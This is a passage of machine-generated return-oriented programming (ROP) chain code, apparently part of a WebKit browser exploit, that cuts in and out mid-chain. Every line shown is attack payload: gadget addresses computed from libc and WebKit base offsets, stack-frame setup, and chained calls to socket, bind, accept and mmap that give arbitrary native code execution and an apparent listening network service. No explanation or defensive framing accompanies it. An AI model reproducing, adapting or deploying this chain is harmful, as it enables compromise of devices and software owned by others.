libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+206806, //pop rdi
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+432898, //pop r8
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+811575, //pop rsp
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([208, 0]); // 0xd0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967080, 4294967295]); // -0xd8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([200, 0]); // 0xc8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967088, 4294967295]); // -0xd0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([192, 0]); // 0xc0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967096, 4294967295]); // -0xc8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([184, 0]); // 0xb8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967104, 4294967295]); // -0xc0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([176, 0]); // 0xb0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967112, 4294967295]); // -0xb8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([168, 0]); // 0xa8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967272, 4294967295]); // -0x18
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+792472 //pop rcx
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
webkit_base+5202439, //and rax, rcx
libc_base+792472, //pop rcx
socket_addr,
webkit_base+2997875, //mov [rax], rcx
libc_base+793877 //pop rsi
]);
db([4294967192, 4294967295]); // -0x68
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+793877 //pop rsi
]);
db([48, 0]); // 0x30
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+759626, //mov rax, r8
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([32, 0]); // 0x20
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+793877 //pop rsi
]);
db([24, 0]); // 0x18
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([128, 0]); // 0x80
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+213352, //L3460
webkit_base+7438103, //mov [rsi], rax
libc_base+811575 //pop rsp
]);
//L3460:
db([0, 0]); // 0x0
//L3210:
set_gadget(libc_base+793877,); //pop rsi
db([208, 0]); // 0xd0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+206806, //pop rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+793877, //pop rsi
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+105267, //pop rdx
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+792472, //pop rcx
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+432898, //pop r8
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+10235455, //pop r9
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+785193, //xor rax, rax
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+11, //nop
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+11, //nop
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+793877, //pop rsi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+7438103, //mov [rsi], rax
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+792472, //pop rcx
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+206806, //pop rdi
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+432898, //pop r8
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+811575, //pop rsp
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([208, 0]); // 0xd0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967080, 4294967295]); // -0xd8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([200, 0]); // 0xc8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967088, 4294967295]); // -0xd0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([192, 0]); // 0xc0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967096, 4294967295]); // -0xc8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([184, 0]); // 0xb8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967104, 4294967295]); // -0xc0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([176, 0]); // 0xb0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967112, 4294967295]); // -0xb8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([168, 0]); // 0xa8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967272, 4294967295]); // -0x18
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+792472 //pop rcx
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
webkit_base+5202439, //and rax, rcx
libc_base+792472, //pop rcx
bind_addr,
webkit_base+2997875, //mov [rax], rcx
libc_base+793877 //pop rsi
]);
db([4294967192, 4294967295]); // -0x68
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+793877 //pop rsi
]);
db([48, 0]); // 0x30
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+759626, //mov rax, r8
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([32, 0]); // 0x20
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+793877 //pop rsi
]);
db([24, 0]); // 0x18
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([128, 0]); // 0x80
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+214680, //L3461
webkit_base+7438103, //mov [rsi], rax
libc_base+811575 //pop rsp
]);
//L3461:
db([0, 0]); // 0x0
//L3243:
set_gadget(libc_base+793877,); //pop rsi
db([208, 0]); // 0xd0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+206806, //pop rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+793877, //pop rsi
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+105267, //pop rdx
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+792472, //pop rcx
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+432898, //pop r8
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+10235455, //pop r9
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+785193, //xor rax, rax
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+11, //nop
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+11, //nop
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+793877, //pop rsi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+7438103, //mov [rsi], rax
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+792472, //pop rcx
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+206806, //pop rdi
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+432898, //pop r8
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+811575, //pop rsp
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([208, 0]); // 0xd0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967080, 4294967295]); // -0xd8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([200, 0]); // 0xc8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967088, 4294967295]); // -0xd0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([192, 0]); // 0xc0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967096, 4294967295]); // -0xc8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([184, 0]); // 0xb8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967104, 4294967295]); // -0xc0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([176, 0]); // 0xb0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967112, 4294967295]); // -0xb8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([168, 0]); // 0xa8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967272, 4294967295]); // -0x18
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+792472 //pop rcx
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
webkit_base+5202439, //and rax, rcx
libc_base+792472, //pop rcx
accept_addr,
webkit_base+2997875, //mov [rax], rcx
libc_base+793877 //pop rsi
]);
db([4294967192, 4294967295]); // -0x68
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+793877 //pop rsi
]);
db([48, 0]); // 0x30
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+759626, //mov rax, r8
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([32, 0]); // 0x20
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+793877 //pop rsi
]);
db([24, 0]); // 0x18
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([128, 0]); // 0x80
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+216008, //L3462
webkit_base+7438103, //mov [rsi], rax
libc_base+811575 //pop rsp
]);
//L3462:
db([0, 0]); // 0x0
//L2960:
set_gadget(libc_base+793877,); //pop rsi
db([208, 0]); // 0xd0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+206806, //pop rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+793877, //pop rsi
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+105267, //pop rdx
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+792472, //pop rcx
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+432898, //pop r8
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+10235455, //pop r9
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+785193, //xor rax, rax
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+11, //nop
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+11, //nop
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+793877, //pop rsi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+7438103, //mov [rsi], rax
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+792472, //pop rcx
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+206806, //pop rdi
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+432898, //pop r8
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+811575, //pop rsp
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([208, 0]); // 0xd0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967080, 4294967295]); // -0xd8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([200, 0]); // 0xc8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967088, 4294967295]); // -0xd0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([192, 0]); // 0xc0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967096, 4294967295]); // -0xc8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([184, 0]); // 0xb8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967104, 4294967295]); // -0xc0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([176, 0]); // 0xb0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967112, 4294967295]); // -0xb8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([168, 0]); // 0xa8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967272, 4294967295]); // -0x18
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+792472 //pop rcx
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
webkit_base+5202439, //and rax, rcx
libc_base+792472, //pop rcx
mmap_addr,
webkit_base+2997875, //mov [rax], rcx
libc_base+793877 //pop rsi
]);
db([4294967192, 4294967295]); // -0x68
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+793877 //pop rsi
]);
db([48, 0]); // 0x30
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+759626, //mov rax, r8
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([32, 0]); // 0x20
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+793877 //pop rsi
]);
db([24, 0]); // 0x18
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([128, 0]); // 0x80
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+217336, //L3463
webkit_base+7438103, //mov [rsi], rax
libc_base+811575 //pop rsp
]);
//L3463:
db([0, 0]); // 0x0
//L3442:
set_gadget(libc_base+793877,); //pop rsi
db([208, 0]); // 0xd0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+206806, //pop rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+793877, //pop rsi
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+105267, //pop rdx
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+792472, //pop rcx
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+432898, //pop r8
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+10235455, //pop r9
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+785193, //xor rax, rax
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+11, //nop
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+11, //nop
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+793877, //pop rsi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+7438103, //mov [rsi], rax
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+792472, //pop rcx
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+206806, //pop rdi
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+432898, //pop r8
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+811575, //pop rsp
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967272, 4294967295]); // -0x18
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([216, 0]); // 0xd8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967072, 4294967295]); // -0xe0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([208, 0]); // 0xd0
set_gadgets([
